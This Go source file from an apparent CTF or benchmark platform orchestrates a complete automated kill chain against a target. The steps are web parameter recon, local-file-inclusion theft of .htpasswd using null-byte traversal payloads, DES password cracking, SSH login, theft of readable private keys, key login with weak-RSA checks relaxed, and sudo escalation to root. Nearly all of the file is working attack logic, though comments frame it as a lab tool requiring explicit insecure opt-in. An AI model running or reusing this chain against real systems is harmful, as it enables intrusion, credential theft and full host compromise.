package ctfplatform

// killchain.go —— 把散落的单项能力编排成一条可复用的完整杀伤链。
//
// 定位：**实验靶场编排器**，不是判分路径。它不产生 WebFinding、不提交 flag、
// 不影响基准分数；只回答"给定一个入口 URL，这套能力能走多远"。
//
// 链条（每步独立可观测，失败即停并保留已完成步骤的证据）：
//   1. recon     自动发现 Web 参数 + 敏感文件证据
//   2. loot      经 LFI 取出 .htpasswd
//   3. crack     DES 字典破解
//   4. ssh       口令登录拿初始 shell
//   5. keytheft  自动发现世界可读的私钥（不猜用户名）
//   6. keylogin  私钥登录（PPK 自动转 PEM）
//   7. privesc   sudo 提权，判定是否 uid=0
//
// 安全：默认拒绝 insecure 主机密钥；口令/私钥只在内存传递，不进日志、不落盘。

import (
	"context"
	"fmt"
	"os"
	"regexp"
	"strings"
	"time"
)

// ChainStep 是链条中的一步。
type ChainStep struct {
	Name    string        // 步骤名
	OK      bool          // 是否成功
	Detail  string        // 摘要（不含敏感信息）
	Elapsed time.Duration // 耗时
}

// KillChainResult 是一条完整链的执行结果。
type KillChainResult struct {
	Steps  []ChainStep
	Root   bool   // 是否拿到 uid=0
	RootID string // 提权成功时的 `id` 输出
}

// KillChainOptions 是链条参数。
type KillChainOptions struct {
	BaseURL       string        // Web 入口，如 http://127.0.0.1:8080/
	SSHAddr       string        // SSH 地址，如 127.0.0.1:2222
	Wordlist      []string      // 候选口令（空则用内置字典）
	TargetUser    string        // 可选：优先选该用户的私钥；留空则取第一个可读私钥
	KnownUser     string        // 已知初始用户（给了就跳过破解）
	KnownPassword string        // 已知初始口令
	AllowInsecure bool          // 必须显式为 true（实验环境）
	StepTimeout   time.Duration // 单步超时，默认 30s
}

// RunKillChain 执行完整链条。任何一步失败即停止，已完成步骤保留在结果里。
func RunKillChain(ctx context.Context, opts KillChainOptions) *KillChainResult {
	res := &KillChainResult{}
	if opts.StepTimeout <= 0 {
		opts.StepTimeout = 30 * time.Second
	}

	step := func(name string, fn func() (string, error)) bool {
		start := time.Now()
		detail, err := fn()
		s := ChainStep{Name: name, OK: err == nil, Detail: detail, Elapsed: time.Since(start).Round(time.Millisecond)}
		if err != nil {
			if s.Detail == "" {
				s.Detail = err.Error()
			} else {
				s.Detail = s.Detail + "；错误: " + err.Error()
			}
		}
		res.Steps = append(res.Steps, s)
		return err == nil
	}

	// ---------- 1. recon ----------
	if !step("recon", func() (string, error) {
		eps, params := DiscoverWebParams(ctx, opts.BaseURL)
		if len(params) == 0 && len(eps) == 0 {
			return "", fmt.Errorf("入口页未发现任何端点或参数")
		}
		ev := ProbeSensitiveFileRead(ctx, opts.BaseURL, WebHints{})
		sigs := make([]string, 0, len(ev))
		for _, e := range ev {
			sigs = append(sigs, e.Signal)
		}
		return fmt.Sprintf("端点=%d 参数=%v 证据=%v", len(eps), params, sigs), nil
	}) {
		return res
	}

	// ---------- 2. loot：LFI 取 .htpasswd ----------
	var entries []HtpasswdEntry
	if !step("loot", func() (string, error) {
		cl := webClient(8 * time.Second)
		// 常见受限目录位置，逐个尝试
		paths := []string{
			"../restricted/.htpasswd%00",
			"../.htpasswd%00",
			"../../restricted/.htpasswd%00",
		}
		reLine := regexp.MustCompile(`(?m)^[A-Za-z0-9_.\-]{1,32}:[A-Za-z0-9./]{13}$`)
		for _, p := range paths {
			u := strings.TrimSuffix(opts.BaseURL, "/") + "/?page=" + p
			code, body, _, err := webFetch(ctx, cl, u)
			if err != nil || code <= 0 {
				continue
			}
			lines := reLine.FindAllString(string(body), 50)
			if len(lines) == 0 {
				continue
			}
			entries = ParseHtpasswd(strings.Join(lines, "\n"))
			if len(entries) > 0 {
				users := make([]string, 0, len(entries))
				for _, e := range entries {
					users = append(users, e.User)
				}
				return fmt.Sprintf("经 %s 取得 %d 条记录，用户=%v", p, len(entries), users), nil
			}
		}
		return "", fmt.Errorf("三处常见路径均未取到 DES 条目")
	}) {
		return res
	}

	// ---------- 3. crack ----------
	var cred *CrackedCred
	if !step("crack", func() (string, error) {
		if opts.KnownUser != "" && opts.KnownPassword != "" {
			cred = &CrackedCred{User: opts.KnownUser, Password: opts.KnownPassword}
			return "使用调用方提供的已知凭据（跳过字典）", nil
		}
		words := opts.Wordlist
		if len(words) == 0 {
			users := make([]string, 0, len(entries))
			for _, e := range entries {
				users = append(users, e.User)
			}
			words = BuiltinWordlist(users)
		}
		cracked := CrackHtpasswdBatched(entries, words, len(opts.Wordlist) > 0, 20000, 0)
		if len(cracked) == 0 {
			return fmt.Sprintf("字典 %d 词未命中 %d 条记录", len(words), len(entries)), fmt.Errorf("破解失败")
		}
		cred = &cracked[0]
		return fmt.Sprintf("命中用户 %s（尝试 %d 次）", cred.User, cred.Tries), nil
	}) {
		return res
	}

	// ---------- 4. ssh：口令登录 ----------
	if !step("ssh", func() (string, error) {
		acc, err := TrySSHLogin(ctx, opts.SSHAddr, cred.User, cred.Password, opts.AllowInsecure, opts.StepTimeout)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("%s：%s", acc.Hostname, acc.WhoAmI), nil
	}) {
		return res
	}

	// ---------- 5. keytheft：自动发现并读取可读私钥 ----------
	var pemKey []byte
	var keyUser string
	if !step("keytheft", func() (string, error) {
		keys, err := FindReadableSSHKeys(ctx, opts.SSHAddr, cred.User, cred.Password, opts.AllowInsecure, opts.StepTimeout)
		if err != nil {
			return "", err
		}
		// 指定了目标用户就优先它的私钥；否则取第一个可读的（不猜用户名）
		chosen := keys[0]
		if opts.TargetUser != "" {
			for _, k := range keys {
				if k.Owner == opts.TargetUser {
					chosen = k
					break
				}
			}
		}
		material, err := LoadKeyMaterial(ctx, opts.SSHAddr, cred.User, cred.Password,
			chosen.Path, opts.AllowInsecure, opts.StepTimeout)
		if err != nil {
			return "", err
		}
		pemKey = material
		keyUser = chosen.Owner
		return fmt.Sprintf("发现 %d 个可读私钥，选用 %s（属主 %s，权限 %s，PEM %d 字节）",
			len(keys), chosen.Path, chosen.Owner, chosen.Perm, len(material)), nil
	}) {
		return res
	}

	// ---------- 6. keylogin：用私钥登录 ----------
	if !step("keylogin", func() (string, error) {
		acc, err := TrySSHLoginWithKey(ctx, opts.SSHAddr, keyUser, pemKey, opts.AllowInsecure, opts.StepTimeout)
		if err != nil {
			// 老靶机私钥常见 1023 位，Go 1.24+ 默认拒绝；仅实验环境放开后重试一次
			if strings.Contains(err.Error(), "insecure") || strings.Contains(err.Error(), "1023") {
				_ = os.Setenv("GODEBUG", "rsa1024min=0")
				acc, err = TrySSHLoginWithKey(ctx, opts.SSHAddr, keyUser, pemKey, opts.AllowInsecure, opts.StepTimeout)
				if err == nil {
					return fmt.Sprintf("%s（已放开 rsa1024min 以接受老密钥）：%s", acc.User, acc.WhoAmI), nil
				}
			}
			return "", err
		}
		return fmt.Sprintf("%s：%s", acc.User, acc.WhoAmI), nil
	}) {
		return res
	}

	// ---------- 7. privesc ----------
	step("privesc", func() (string, error) {
		out, err := RunSSHCommandWithKey(ctx, opts.SSHAddr, keyUser, pemKey, "sudo id 2>&1",
			opts.AllowInsecure, opts.StepTimeout)
		if err != nil && !strings.Contains(out, "uid=") {
			return "", err
		}
		line := strings.TrimSpace(out)
		if !strings.Contains(line, "uid=0(root)") {
			return line, fmt.Errorf("未取得 root")
		}
		res.Root = true
		res.RootID = line
		return line, nil
	})
	return res
}

// Summary 返回一行摘要，便于日志/报告使用（不含敏感信息）。
func (r *KillChainResult) Summary() string {
	ok := 0
	for _, s := range r.Steps {
		if s.OK {
			ok++
		}
	}
	verdict := "未到 root"
	if r.Root {
		verdict = "已到 root"
	}
	return fmt.Sprintf("%d/%d 步成功，%s", ok, len(r.Steps), verdict)
}
